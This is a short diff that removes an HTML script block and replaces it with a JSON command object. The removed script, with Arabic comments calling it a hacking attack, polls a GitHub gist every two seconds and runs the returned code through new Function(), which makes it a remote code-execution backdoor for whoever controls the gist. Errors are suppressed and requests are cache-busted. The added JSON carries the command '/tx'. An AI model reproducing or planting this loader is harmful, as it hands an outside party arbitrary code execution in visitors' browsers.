@@ -1,24 +1,3 @@
-<script>
-    // هذا الرابط ثابت ولا يتغير أبداً
-    const gistUrl = "https://gist.githubusercontent.com/aso818/036d35d5f22a44cd5ec3630d8a70b3ca/raw/command.json";
-    let lastExecuted = ""; 
-
-    async function startHacking() {
-        try {
-            // إضافة التوقيت لمنع التخزين المؤقت (Cache)
-            const response = await fetch(gistUrl + "?t=" + Date.now());
-            const data = await response.json();
-
-            if (data.code && data.code !== "" && data.code !== lastExecuted) {
-                lastExecuted = data.code; 
-                console.log("جاري تنفيذ الهجوم السريع...");
-                new Function(data.code)();
-            }
-        } catch (e) {
-            // في حال كان الرابط لا يزال يحدث أو الملف فارغ
-        }
-        setTimeout(startHacking, 2000); 
-    }
-
-    startHacking();
-</script>
+{
+  "code": "/tx"
+}
